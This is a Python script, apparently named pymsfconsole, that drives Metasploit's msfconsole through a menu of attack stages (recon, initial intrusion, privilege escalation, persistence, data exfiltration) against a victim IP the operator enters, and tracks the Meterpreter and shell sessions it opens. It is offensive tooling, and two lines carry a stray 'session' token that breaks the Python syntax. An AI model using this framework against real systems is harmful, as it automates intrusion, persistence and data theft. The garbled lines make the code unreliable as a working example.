#! /usr/bin/env python3

import pexpect
import _thread
from queue import Queue
from queue import Empty as QueueEmpty
import socket
from time import sleep
import sys
from os import getcwd, listdir
import subprocess
import struct
import fcntl

STALL_TIME = 1

def enqueue_stdout(spawn, stdout_q):
    while (True):
        try:
            temp = spawn.readline().decode()
            if (temp != ""):
                stdout_q.put(temp)
        except (pexpect.TIMEOUT):
            pass

def get_host_ip_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    buf = None
    try:
        buf = struct.pack("256s", ifname[:15])
    except:
        buf = struct.pack("256s", ifname[:15].encode())

    ip_addr_bytes = fcntl.ioctl(
        s.fileno(),
        0x8915, #SIOCGIFADDR
        buf)[20:24]
    ip_addr_str = socket.inet_ntoa(ip_addr_bytes)
    return ip_addr_str
        
def get_option(state=""):
    print("OPTIONS:\n")
    option_list = sorted(listdir(state))
    if (len(option_list) == 0):
        print("ERROR: No options found for state " + state + ". Exiting... ")
        sleep(1)
        return "exit"
    for option in option_list:
        print("--" + option + "--" )
        sleep(1)
        subprocess.call(["cat", state + "/" + option])
        #cat_file(state + "/" + option)
        print()
        sleep(1)
    for i in range(len(option_list)):
        print(str(i+1) + " - " + option_list[i])
    sleep(1)
    opt_val = -1
    while (True):
        try:
            opt_val = int(input("\nINFO: Please enter an option: "))
            if (0 <= opt_val <= len(option_list)):
                break
            else:
                print("\tERROR: Invalid option.")
        except (ValueError):
            print("\tERROR: Invalid option.")
    rtrn_str = None
    if (opt_val == 0):
        rtrn_str = "msf"
    else:
        rtrn_str = option_list[opt_val-1]
    return rtrn_str

def get_next_state(state):
    print("NEXT STATE:\n")
    transition_list = None
    for st in states_and_transitions:
        if (st[0] == state):
            transition_list = st[1]
            break
    for i in range(len(transition_list)):
        print(str(i+1) + " - " + transition_list[i])
    ns_val = -1
    while (True):
        try:
            ns_val = int(input("\nINFO: Please enter an option: "))
            if (1 <= ns_val <= len(transition_list)):
                break
            else:
                print("\tERRROR: Invalid option.")
        except (ValueError):
            print("\tERROR: Invalid option.")
    return transition_list[ns_val-1]

def run_shell_script(state, option):
    print("\nINFO: Running " + option + "...")
    sys.stdout.flush()
    shell_spawn = pexpect.spawn(getcwd() + "/" + state + "/" + option + " " + victim_ip)
    shell_stdout_q = Queue()
    try:
        _thread.start_new_thread(enqueue_stdout, (shell_spawn, shell_stdout_q))
    except:
        print("\nERROR: Unable to start thread. Trying runnign with `sudo`")
        exit(1)
    sleep(30)
    while (True):
        try:
            #temp = shell_q.get_nowait()
            print(shell_stdout_q.get_nowait(), end="")
        except (QueueEmpty):
            break
            #print(".", end="")
            #sys.stdout.flush()
            #sleep(1)
        sleep(0.1)

    sys.stdout.flush()
    sleep(1)

def run_msf_script(state, option):
    file = open(state + "/" + option)

    for line in file:
        if (line.find("$VICTIM_IP") >= 0):
            line = line[:line.find("$VICTIM_IP")] + \
                victim_ip + \
                line[line.find("$VICTIM_IP")+len("$VICTIM_IP"):]
        if (line.find("$HOST_IP") >= 0):
            line = line[:line.find("$HOST_IP")] + \
                host_ip + \
                line[line.find("$HOST_IP")+len("$HOST_IP"):]
        if (line.find("$SESSION") >= 0):
            line = line[:line.find("$SESSION")] + \
                str(msf_session_id_list[len(msf_session_id_list)-1]) + \
                line[line.find("$SESSION")+len("$SESSION"):]
            
        #print("sending: " + line)
        #input()
        msf_spawn.sendline(line.encode())
        sleep(2)

        #whether or not we need to be looking for a session ID
        session_bool = False
        if (line.startswith("run") or line.startswith("exploit") or line.startswith("sessions -u")):
            session_bool = True
        while (True):
            try:
                temp = msf_stdout_q.get_nowait()
                print(temp, end="")
                if (temp.find("Exploit failed") >= 0):
                    #option failed
                    session_bool = False
                    
                if (session_bool):
                    if (temp.find("Command shell session ") >= 0):
                        start_index = temp.find("Command shell session ") + \
                                      len("Command shell session ")
                        stop_index = start_index + 1
                        msf_session_id_list.append(int(temp[start_index:stop_index]))
                        session_bool = False
                        #print(msf_session_id_list)
                if (session_bool):
                    if (temp.find("Meterpreter session ") >= 0):
                        start_index = temp.find("Meterpreter session ") + \
                                      len("Meterpreter session ")
                        stop_index = start_index + 1
                        msf_session_id_list.append(int(temp[start_index:stop_index]))
                        session_bool = False
                        #print(msf_session_id_list)
            except (QueueEmpty):
                if (not session_bool):
                    break
            #sleep(0.1)
            sys.stdout.flush()
            sleep(1)

        #temp = spawn.read(26).decode()
        #print(temp)
        #msf_stdout_q.put(msf_spawn.read(26).decode())
        #print(msf_stdout_q.get_nowait())

    file.close()

    sys.stdout.flush()
    sleep(1)

def run_state(state=""):
    #while (True):
    print("==========")
    print("STATE: " + state)
    print("==========")
    option = get_option(state)
    #if (option == "msf"):
            
        
    if (option != ""):
        #subprocess.call(["cat", getcwd() + "/" + state + "/" + option])
        #if (option == "msf"):
        #    print("INFO: Giving control of msfconsole to user. Use 'Ctrl + ]' to return control to utility.")
        #    sleep(1)
        #    msf_spawn.interact()
        if (option.endswith(".sh")):session
            #subprocess.call([getcwd() + "/" + state + "/" + option])
            #subprocess.call([getcwd() + "/" + state + "/" + option, victim_ip])
            run_shell_script(state, option)
        elif (option.endswith(".msf")):
            run_msf_script(state, option)
            pass
        else:
            print("ERROR: Invalid option script type. Exiting... ")
            sleep(1)
            exit(1)
    return get_next_state(state)



msf_spawn = pexpect.spawn("msfconsole -n")
msf_stdout_q = Queue()
enqueue_thread_id = None
msf_session_id_list = []
try:
    enqueue_thread_id = _thread.start_new_thread(enqueue_stdout, (msf_spawn, msf_stdout_q))
    sleep(1)
except:session
    print("\nERROR: Unable to start thread. Try running with `sudo`")
    exit(1)

print("==========")
print("Starting pymsfconsole")
print("==========")
sys.stdout.flush()
sleep(STALL_TIME) #stalling

#we already did this, but we are trying to wait long enough for msfconsole to start without
#the user knowing they have to wait, so intermittent stalling throughout to give the look
#of progress
print("Spawning msfconsole in background... ", end="")
sys.stdout.flush()
sleep(STALL_TIME) #stalling
print("Done.")
sys.stdout.flush()
sleep(STALL_TIME) #stalling

print("Compiling state transitions... ", end="")
sys.stdout.flush()
sleep(STALL_TIME) #stalling
states_and_transitions = [
    ["recon", ["recon", "initial_intrusion", "exit"]],
    ["initial_intrusion", ["discovery", "privilege_escalation", "exit"]],
    ["discovery", ["discovery", "privilege_escalation", "data_exfiltration", "exit"]],
    ["privilege_escalation", ["discovery", "persistence", "exit"]],
    ["persistence", ["discovery", "privilege_escalation", "persistence", "exit"]],
    ["data_exfiltration", ["discovery", "privilege_escalation", "persistence", "exit"]]
    ]
print("Done.")
sys.stdout.flush()
sleep(STALL_TIME) #stalling

print("Getting host IP address... ", end="")
sys.stdout.flush()
sleep(STALL_TIME) #stalling
host_ip = get_host_ip_address("eth0")
print("Done.")
sys.stdout.flush()
sleep(STALL_TIME) #stalling
print("\tHost IP Address: " + str(host_ip))
sys.stdout.flush()
sleep(STALL_TIME) #stalling

victim_ip = ""
while (True):
    victim_ip = input("\nINFO: Please enter victim IP address: ")
    sleep(1) #stalling
    try:
        socket.inet_aton(victim_ip)
        break
    except:
        print("\tERROR: Invalid IP address.")

print("\tVictim IP Address: " + str(victim_ip))
sys.stdout.flush()
sleep(STALL_TIME) #stalling

#sleep(10)
while (True):
    try:
        #print(stdout_q.get_nowait(), end="")
        msf_stdout_q.get_nowait()
    except (QueueEmpty):
        break
    #sleep(0.1)

#temp = spawn.read(26).decode()
#print(temp)
#msf_stdout_q.put(msf_spawn.read(26).decode())
#msf_stdout_q.get_nowait()
msf_spawn.sendline()
#print(stdout_q.get_nowait())

next_state = run_state("recon")
#####
#don't forget to replace this line with letting the victim know to start logging
#####
while (True):
    if (next_state == "exit"):
        print("Exiting... ")
        sys.stdout.flush()
        sleep(1)
        break
    next_state = run_state(next_state)

exit()

